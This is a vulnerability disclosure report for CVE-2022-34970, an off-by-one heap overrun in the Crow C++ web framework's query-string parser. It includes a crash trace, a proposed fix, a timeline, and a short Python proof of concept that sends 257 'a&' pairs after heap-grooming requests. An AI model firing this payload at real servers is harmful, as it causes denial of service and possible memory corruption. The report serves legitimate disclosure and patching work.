<h2><b><i>Summary</i></b></h2>

Crow version prior to [v1.0+4](https://github.com/CrowCpp/Crow/releases/tag/v1.0%2B4) are vulnerable to an off-by-one buffer
overrun due to faulty implementation of qs_parse function within
query_string.h. An attacker can craft special input which leads to an overrun
in the qs_kv buffer, which can lead to either Information Disclosure, Denial of
Service, or Remote Code Execution (though this is admittedly hard to exploit).
See sections below for details.

Affected: Crow version prior to <a src="https://github.com/CrowCpp/Crow/releases/tag/v1.0%2B4">v1.0+4</a>

<a src="https://github.com/CrowCpp/Crow">https://github.com/CrowCpp/Crow</a> - maintained version (fork)

<a src="https://github.com/ipkn/crow">https://github.com/ipkn/crow</a> - original version

CVE: [CVE-2022-34970](https://www.cve.org/CVERecord?id=CVE-2022-34970)

CVSS: 9.8 (Critical - according to advisory), CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
<blockquote>
"Crow is a C++ framework for creating HTTP or Websocket web services. It uses
 routing similar to Python's Flask which makes it easy to use. It is also
 extremely fast, beating multiple existing C++ frameworks as well as non C++
 frameworks."</blockquote> (source: project's README.md)<br></br>

<b>IMPORTANT:</b> This vulnerability is reported under the 90-day policy
(version 2021), i.e. this report will be shared publicly with the defensive
community on 26 September 2022 if a patch/fix is not available by that time, or
30 days after the fix becomes available. For details please see: <a
src="https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html">https://googleprojectzero.blogspot.com/2021/04/policy-and-disclosure-2021-edition.html</a>

<b>NOTE:</b> The vulnerable function was copied from the [qs_parse project](https://github.com/bartgrantham/qs_parse), but the
project has been inactive for the last 10 years and as such I decided it makes
more sense to report this straight to CrowCpp/Crow project as it's both
maintained and active. Similar reason for not reporting it to the inactive
original Crow project.


<h2><b><i>Vulnerability details</i></b></h2>

The vulnerability is located in a function called qs_parse, which is executed to
parse URL's query string on each request. Technically it's an inline function
which is called from query_string's constructor.

The off-by-one buffer overrun happens due to an iterator variable ```i``` being
incremented one time too many in case there is more than a maximum number
(256) of key-value pairs in the query.

```https://example.com/?a&a&a&...``` at least 257 of these...&a&a&a

Due to the unconditional increment of ```i``` on [line 126](https://github.com/CrowCpp/Crow/blob/6f1baed6d36640bf36b10822fe8e65cd2fc75dd0/include/crow/query_string.h#L126), the value of ```i``` later
in the function will be 257.

As such, the last loop in the qs_parse function tries to process the 256th
element of qs_kv as a key-value pair, and in effect dereferences a pointer
outside of the buffer (which has only 256 elements).
Given that the buffer is technically part of an std::vector, this leads to using
a potentially attacker controlled value previously planted on the heap right
after the buffer. In my experiments I was able to confirm this - note below the
controlled value of ```s=0x4141414141414141``` in frame #1 in the GDB listing from
the moment of crash.
```
pwndbg> where
#0  __m128i_shift_right (offset=1, value=<error reading variable: Cannot access
 memory at address 0x4141414141414140>)
 at ../sysdeps/x86_64/multiarch/varshift.h:27
#1  __strcspn_sse42 (s=0x4141414141414141 <error: Cannot access memory at
 address 0x4141414141414141>, a=<optimized out>)
 at ../sysdeps/x86_64/multiarch/strcspn-c.c:143
#2  0x00005555555a126f in crow::HTTPParser<crow::Connection<crow::SocketAdaptor,
 crow::Crow<ExampleMiddleware>, ExampleMiddleware> >::on_message_complete
 (crow::http_parser*) ()
#3  0x0000555555571129 in crow::http_parser_execute
 (crow::http_parser*, crow::http_parser_settings const*, char const*, unsigned
 long) ()
#4  0x000055555556954e in crow::Connection<crow::SocketAdaptor,
 crow::Crow<ExampleMiddleware>, ExampleMiddleware>::do_read()::{lambda
 (std::error_code const&, unsigned long)#1}::operator()(std::error_code const&,
 unsigned long) const [clone .isra.0] ()
```


<h3><b><i> Exploitation and potential consequences</i></b></h3>

As demonstrated, an attacker can attempt to remotely "massage" the heap in a way
that would place an attacker-controlled or attacker-chosen pointer value in
memory right after the qs_kv buffer. In such a case the qs_parse key/value
processing code would operate on the target string (memory) chosen by the
attacker.

Note that up until this point I have empirically confirmed what's in this
report. Two paragraphs below however are speculative, but I believe them to be
accurate.

In case the actual web service echos back a URL query parameter in any way, this
may lead to information disclosure. This is subject to the attacker either
knowing the memory layout or being able to manipulate the heap layout in such a
way, that a selected valid pointer would be placed after the qs_kv buffer.

Furthermore, in case the attacker has good understanding of the memory layout
and access to the binaries, they can use the write primitive in the processing
loop to replace a selected '&' in memory with a null byte '\0'. While on the
surface this sounds like an unlikely exploitation vector, this technically
gives the attacker the possibility of changing the chosen byte of value 0x26 in
memory to 0x00. If this would be applied to e.g. function pointers or other
pointers, it might eventually lead to gaining full arbitrary code execution
capabilities by the attacker. Just to be on the safe side I would recommend
treating this as possible unless proven otherwise (especially that it has been
historically proven that such conditions are exploitable).

Failed exploitation leads to the server crashing.


<h3><b><i>Proposed fix</i></b></h3>


Before actually incrementing the variable ```i``` check whether it can be
incremented (i.e. if post-increment it would be still less than 256).


<h3><b><i>Proof of Concept exploit</i></b></h3>

```python
#!/usr/bin/python3
import socket

host = "127.0.0.1" 
port = 18080

def req(payload):

  client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  client.connect((host, port))

  request = f"GET /{payload} HTTP/1.1\r\nHost:{host}\r\n\r\n" 
  client.send(request.encode())

  response = client.recv(4096) 
  http_response_len = len(response)

  print(f"[RECV] - length: {http_response_len}\n") 
  print(response.decode('utf-8'))

payload = '?' + ("a&" * 257)

for i in range(100): 
  req('A' * (1970 + i))

req(payload) 
```

<h3><b><i>Timeline</i></b></h3>
<ul>
  <li>2022-06-26: Vulnerability discovered.</li>
  <li>2022-06-27: Sent vulnerability report to maintainer of Crow, got confirmation of received report.</li>
  <li>2022-06-28: Maintainer released the patch for fixing the issue.</li>
  <li>2022-07-29: Published report.</li>
  <li>2022-08-04: CVE assigned - CVE-2022-34970</li>
</ul>

